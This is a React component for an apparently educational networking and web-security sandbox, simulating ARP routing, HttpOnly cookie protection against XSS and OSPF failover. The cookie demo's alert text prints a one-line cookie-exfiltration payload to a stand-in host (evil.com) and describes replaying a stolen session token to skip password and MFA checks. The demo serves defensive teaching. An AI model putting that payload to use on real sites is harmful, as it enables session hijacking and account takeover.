"use client";

import { useState } from "react";
import Link from "next/link";
import { playSoftClick, playPacketPing, playAlert, playSuccessChime } from "@/lib/sound";
import styles from "./ProtocolSandbox.module.css";

export default function ProtocolSandbox() {
  const [activeTab, setActiveTab] = useState("arp");

  // Tab 1: ARP state
  const [arpSubnet, setArpSubnet] = useState("remote"); // "local" | "remote"
  const [arpState, setArpState] = useState("idle"); // "idle" | "resolving" | "success"

  // Tab 2: Cookie Security state
  const [httpOnly, setHttpOnly] = useState(true);
  const [sameSite, setSameSite] = useState(true);
  const [cookieState, setCookieState] = useState("idle"); // "idle" | "testing" | "result"

  // Tab 3: OSPF state
  const [linkSevered, setLinkSevered] = useState(false);
  const [ospfState, setOspfState] = useState("converged"); // "converged" | "recalculating"

  // Handler for ARP Simulation
  const runArpSimulation = () => {
    playSoftClick();
    setArpState("resolving");
    setTimeout(() => {
      playPacketPing();
      setArpState("success");
    }, 700);
  };

  // Handler for Cookie Attack Simulation
  const runCookieAttack = () => {
    playSoftClick();
    setCookieState("testing");
    setTimeout(() => {
      if (httpOnly) {
        playSuccessChime();
      } else {
        playAlert();
      }
      setCookieState("result");
    }, 600);
  };

  // Handler for OSPF Link Sever
  const toggleOspfLink = () => {
    playSoftClick();
    const nextSevered = !linkSevered;
    setLinkSevered(nextSevered);
    setOspfState("recalculating");
    if (nextSevered) {
      playAlert();
    } else {
      playSuccessChime();
    }
    setTimeout(() => {
      setOspfState("converged");
    }, 800);
  };

  return (
    <section className={styles.sandboxSection} aria-label="Interactive Protocol & Security Sandbox">
      <div className={styles.sandboxHeader}>
        <div className={styles.headerTitles}>
          <span className={styles.sandboxTag}>Interactive Protocol Sandbox</span>
          <h2 className={styles.sandboxTitle}>Simulate &amp; Explore Defense Mechanics</h2>
          <p className={styles.sandboxSubtitle}>
            Test real-world networking behaviors and web attack mitigations in real time. Interact with the controls below to see packet paths, access control logic, and dynamic routing convergence.
          </p>
        </div>

        {/* Simulation Mode Tabs */}
        <div className={styles.tabsList} role="tablist" aria-label="Simulation selectors">
          <button
            type="button"
            role="tab"
            aria-selected={activeTab === "arp"}
            className={`${styles.tabBtn} ${activeTab === "arp" ? styles.tabBtnActive : ""}`}
            onClick={() => {
              playSoftClick();
              setActiveTab("arp");
            }}
          >
            ARP &amp; Gateway
          </button>
          <button
            type="button"
            role="tab"
            aria-selected={activeTab === "cookie"}
            className={`${styles.tabBtn} ${activeTab === "cookie" ? styles.tabBtnActive : ""}`}
            onClick={() => {
              playSoftClick();
              setActiveTab("cookie");
            }}
          >
            Cookie Defense
          </button>
          <button
            type="button"
            role="tab"
            aria-selected={activeTab === "ospf"}
            className={`${styles.tabBtn} ${activeTab === "ospf" ? styles.tabBtnActive : ""}`}
            onClick={() => {
              playSoftClick();
              setActiveTab("ospf");
            }}
          >
            OSPF Convergence
          </button>
        </div>
      </div>

      {/* ─── SIMULATION 1: ARP & GATEWAY ROUTING ─────────────────── */}
      {activeTab === "arp" && (
        <div className={styles.simCard}>
          <div className={styles.simControls}>
            <span className={styles.controlLabel}>Destination Scenario:</span>
            <div className={styles.radioGroup}>
              <button
                type="button"
                className={`${styles.choiceBtn} ${arpSubnet === "local" ? styles.choiceBtnActive : ""}`}
                onClick={() => {
                  playSoftClick();
                  setArpSubnet("local");
                  setArpState("idle");
                }}
              >
                Local Subnet (192.168.1.50)
              </button>
              <button
                type="button"
                className={`${styles.choiceBtn} ${arpSubnet === "remote" ? styles.choiceBtnActive : ""}`}
                onClick={() => {
                  playSoftClick();
                  setArpSubnet("remote");
                  setArpState("idle");
                }}
              >
                Remote Subnet (10.0.0.5)
              </button>
            </div>

            <button
              type="button"
              className={styles.actionButton}
              onClick={runArpSimulation}
              disabled={arpState === "resolving"}
            >
              {arpState === "resolving" ? "Sending Packet..." : "⚡ Send ICMP Echo Ping"}
            </button>
          </div>

          {/* Visual Network Path Diagram */}
          <div className={styles.diagramBox}>
            <div className={styles.node}>
              <span className={styles.nodeIcon}>💻</span>
              <span className={styles.nodeName}>Host A</span>
              <span className={styles.nodeIp}>192.168.1.10</span>
            </div>

            <div className={`${styles.wire} ${arpState !== "idle" ? styles.wireActive : ""}`}>
              <span className={styles.wireLabel}>L2 Switch</span>
            </div>

            <div className={`${styles.node} ${arpSubnet === "remote" ? styles.nodeHighlighted : ""}`}>
              <span className={styles.nodeIcon}>🌐</span>
              <span className={styles.nodeName}>Router Gateway</span>
              <span className={styles.nodeIp}>192.168.1.1</span>
            </div>

            <div className={`${styles.wire} ${arpState !== "idle" && arpSubnet === "remote" ? styles.wireActive : ""}`}>
              <span className={styles.wireLabel}>{arpSubnet === "remote" ? "WAN / Route" : "Direct L2"}</span>
            </div>

            <div className={`${styles.node} ${arpState === "success" ? styles.nodeSuccess : ""}`}>
              <span className={styles.nodeIcon}>🎯</span>
              <span className={styles.nodeName}>Target Host</span>
              <span className={styles.nodeIp}>{arpSubnet === "local" ? "192.168.1.50" : "10.0.0.5"}</span>
            </div>
          </div>

          {/* Simulation Output Log */}
          <div className={styles.simConsole}>
            <div className={styles.consoleHeader}>
              <span className={styles.consoleDot} />
              <span>Host Packet Resolution Terminal</span>
            </div>
            <div className={styles.consoleBody}>
              {arpState === "idle" && (
                <div className={styles.logMuted}>
                  &gt; Ready. Click &ldquo;Send ICMP Echo Ping&rdquo; to trace resolution logic across OSI Layer 2 and Layer 3.
                </div>
              )}
              {arpState === "resolving" && (
                <div className={styles.logHighlight}>
                  &gt; [1/2] Computing destination subnet: Comparing 192.168.1.10 /24 to {arpSubnet === "local" ? "192.168.1.50" : "10.0.0.5"}...
                </div>
              )}
              {arpState === "success" && (
                <>
                  <div className={styles.logText}>
                    &gt; Target {arpSubnet === "local" ? "is in the SAME subnet" : "is in a REMOTE subnet"}!
                  </div>
                  {arpSubnet === "local" ? (
                    <div className={styles.logSuccess}>
                      &gt; [Direct L2 Resolution]: Host A broadcasts ARP request locally. Target responds with its MAC. Frame dispatched directly across switch. Ping successful (RTT: 0.4ms).
                    </div>
                  ) : (
                    <div className={styles.logSuccess}>
                      &gt; [Routed Resolution]: Host A determines destination is remote. Local ARP for 10.0.0.5 is skipped. Frame is addressed to Router Gateway MAC (00:1c:58:...). Gateway de-encapsulates and forwards via L3 routing. Ping successful (RTT: 12.2ms).
                    </div>
                  )}
                </>
              )}
            </div>
          </div>

          {/* Direct Link to Verification Lab */}
          <div className={styles.simFooter}>
            <span className={styles.footerLabel}>Verified in Lab Publication:</span>
            <Link
              href="/publications/lab/layer2-arp-default-gateway-validation"
              className={styles.footerLink}
              onClick={playSoftClick}
            >
              Why Local Pings Fail: Testing Layer 2 ARP &amp; Gateway Boundaries →
            </Link>
          </div>
        </div>
      )}

      {/* ─── SIMULATION 2: PASS-THE-COOKIE DEFENSE ──────────────── */}
      {activeTab === "cookie" && (
        <div className={styles.simCard}>
          <div className={styles.simControls}>
            <span className={styles.controlLabel}>Cookie Security Flags:</span>
            <div className={styles.toggleGroup}>
              <button
                type="button"
                className={`${styles.toggleBtn} ${httpOnly ? styles.toggleOn : styles.toggleOff}`}
                onClick={() => {
                  playSoftClick();
                  setHttpOnly((prev) => !prev);
                  setCookieState("idle");
                }}
              >
                HttpOnly: {httpOnly ? "ENABLED (Recommended)" : "DISABLED (Vulnerable)"}
              </button>
              <button
                type="button"
                className={`${styles.toggleBtn} ${sameSite ? styles.toggleOn : styles.toggleOff}`}
                onClick={() => {
                  playSoftClick();
                  setSameSite((prev) => !prev);
                  setCookieState("idle");
                }}
              >
                SameSite=Strict: {sameSite ? "ACTIVE" : "INACTIVE"}
              </button>
            </div>

            <button
              type="button"
              className={styles.actionButton}
              onClick={runCookieAttack}
              disabled={cookieState === "testing"}
            >
              {cookieState === "testing" ? "Injecting Script..." : "💥 Simulate Cookie Theft Attack"}
            </button>
          </div>

          {/* Visual Attack & Defense Stage */}
          <div className={styles.attackStage}>
            <div className={styles.clientMock}>
              <div className={styles.clientMockHeader}>Browser Storage &amp; DOM</div>
              <div className={styles.cookieEntry}>
                <span className={styles.cookieKey}>__Host-SESSIONID</span>
                <span className={styles.cookieVal}>9f8a3c2b1e0d4e5f</span>
                <div className={styles.flagsList}>
                  {httpOnly && <span className={styles.flagBadge}>HttpOnly</span>}
                  {sameSite && <span className={styles.flagBadge}>SameSite=Strict</span>}
                  <span className={styles.flagBadge}>Secure</span>
                </div>
              </div>
            </div>

            <div className={styles.attackArrow}>
              <span className={styles.attackLabel}>XSS Script Attack</span>
              <span className={styles.attackCode}>document.cookie</span>
            </div>

            <div className={`${styles.attackerBox} ${cookieState === "result" ? (httpOnly ? styles.attackerBlocked : styles.attackerCompromised) : ""}`}>
              <div className={styles.attackerTitle}>
                {cookieState === "result" ? (httpOnly ? "🛡️ ATTACK DEFLECTED" : "🚨 TOKEN HIJACKED") : "Attacker Console"}
              </div>
              <div className={styles.attackerDetail}>
                {cookieState === "idle" && "Waiting to execute malicious payload in web page context..."}
                {cookieState === "testing" && "Querying document.cookie from malicious script..."}
                {cookieState === "result" && (
                  httpOnly ? (
                    <span className={styles.defendedText}>
                      Blocked: document.cookie returned &ldquo;&rdquo;. Browser forbids script access to HttpOnly tokens. Attacker exfiltrates nothing!
                    </span>
                  ) : (
                    <span className={styles.compromisedText}>
                      Exploit: Stole SESSIONID=9f8a... Injecting into incognito window to bypass password and MFA!
                    </span>
                  )
                )}
              </div>
            </div>
          </div>

          {/* Console Log */}
          <div className={styles.simConsole}>
            <div className={styles.consoleHeader}>
              <span className={styles.consoleDot} />
              <span>Defense Assessment</span>
            </div>
            <div className={styles.consoleBody}>
              {cookieState === "idle" && (
                <div className={styles.logMuted}>
                  &gt; Toggle HttpOnly flag on/off, then click &ldquo;Simulate Cookie Theft Attack&rdquo; to observe browser sandbox protection.
                </div>
              )}
              {cookieState === "result" && (
                httpOnly ? (
                  <div className={styles.logSuccess}>
                    &gt; [SUCCESS]: Modern session tokens protected with HttpOnly and __Host- prefix are completely invisible to JavaScript. Even in the presence of stored XSS, session hijacking is prevented.
                  </div>
                ) : (
                  <div className={styles.logAlert}>
                    &gt; [CRITICAL RISK]: Cookie lacked HttpOnly directive. Any cross-site scripting flaw allows one-line exfiltration: fetch(&apos;https://evil.com/leak?&apos; + document.cookie).
                  </div>
                )
              )}
            </div>
          </div>

          {/* Direct Link to Research Article */}
          <div className={styles.simFooter}>
            <span className={styles.footerLabel}>Verified in Offensive Security Research:</span>
            <Link
              href="/publications/research/session-cookie-authentication-mechanics"
              className={styles.footerLink}
              onClick={playSoftClick}
            >
              Testing Pass-the-Cookie Attacks: How Stolen Tokens Bypass Passwords &amp; MFA →
            </Link>
          </div>
        </div>
      )}

      {/* ─── SIMULATION 3: OSPF DYNAMIC CONVERGENCE ─────────────── */}
      {activeTab === "ospf" && (
        <div className={styles.simCard}>
          <div className={styles.simControls}>
            <span className={styles.controlLabel}>Link Health Status:</span>
            <div className={styles.ospfStatusGroup}>
              <span className={`${styles.statusPill} ${linkSevered ? styles.statusWarning : styles.statusGood}`}>
                {linkSevered ? "⚠️ Primary Fiber Cut (Gi0/1 DOWN)" : "🟢 All Backbone Links Normal"}
              </span>
              <span className={styles.statusPill}>
                Convergence: {ospfState === "recalculating" ? "⚡ Re-running SPF..." : "STABLE"}
              </span>
            </div>

            <button
              type="button"
              className={`${styles.actionButton} ${linkSevered ? styles.actionRestore : styles.actionSever}`}
              onClick={toggleOspfLink}
            >
              {linkSevered ? "🔄 Repair & Restore Primary Link" : "✂️ Simulate Fiber Link Sever"}
            </button>
          </div>

          {/* Visual Topology Diagram */}
          <div className={styles.ospfTopology}>
            <div className={styles.routerNode}>
              <span className={styles.routerIcon}>⚡</span>
              <span className={styles.routerName}>Campus Core 1</span>
              <span className={styles.routerId}>Router-ID: 1.1.1.1</span>
            </div>

            <div className={styles.ospfLinks}>
              {/* Primary Link */}
              <div className={`${styles.ospfPath} ${linkSevered ? styles.pathBroken : styles.pathActive}`}>
                <span className={styles.pathLabel}>Primary 10G Fiber (Cost: 10)</span>
                <span className={styles.pathStatus}>
                  {linkSevered ? "✕ SEVERED / DOWN" : "● FORWARDING (Lowest Metric)"}
                </span>
              </div>

              {/* Standby Backup Link */}
              <div className={`${styles.ospfPath} ${linkSevered ? styles.pathActive : styles.pathStandby}`}>
                <span className={styles.pathLabel}>Redundant Trunk (Cost: 25)</span>
                <span className={styles.pathStatus}>
                  {linkSevered ? "● ACTIVE (Traffic Diverted via SPF)" : "○ STANDBY"}
                </span>
              </div>
            </div>

            <div className={styles.routerNode}>
              <span className={styles.routerIcon}>⚡</span>
              <span className={styles.routerName}>Campus Core 2</span>
              <span className={styles.routerId}>Router-ID: 2.2.2.2</span>
            </div>
          </div>

          {/* OSPF Syslog Terminal */}
          <div className={styles.simConsole}>
            <div className={styles.consoleHeader}>
              <span className={styles.consoleDot} />
              <span>Cisco IOS OSPFv2 Event Log</span>
            </div>
            <div className={styles.consoleBody}>
              {linkSevered ? (
                <>
                  <div className={styles.logAlert}>
                    %LINK-3-UPDOWN: Interface GigabitEthernet0/1, changed state to down
                  </div>
                  <div className={styles.logHighlight}>
                    %OSPF-5-ADJCHG: Process 1, Nbr 2.2.2.2 on Gi0/1 from FULL to DOWN, Neighbor Down: Dead timer expired
                  </div>
                  <div className={styles.logSuccess}>
                    %OSPF-5-SPF: Dijkstra calculation executed in 14ms. Installed secondary next-hop via Gi0/2 (Metric 25). Zero packet drop.
                  </div>
                </>
              ) : (
                <div className={styles.logSuccess}>
                  &gt; OSPF Process 1 Area 0: Neighbor 2.2.2.2 is FULL/BDR. Routing table optimal. Primary link carries 100% of inter-campus traffic.
                </div>
              )}
            </div>
          </div>

          {/* Direct Link to Enterprise Network Project */}
          <div className={styles.simFooter}>
            <span className={styles.footerLabel}>Verified in Enterprise Project:</span>
            <Link
              href="/publications/project/enterprise-network-security-architecture"
              className={styles.footerLink}
              onClick={playSoftClick}
            >
              Building an Enterprise Office Network: Multi-Layer Switching, VLANs, &amp; OSPF →
            </Link>
          </div>
        </div>
      )}
    </section>
  );
}
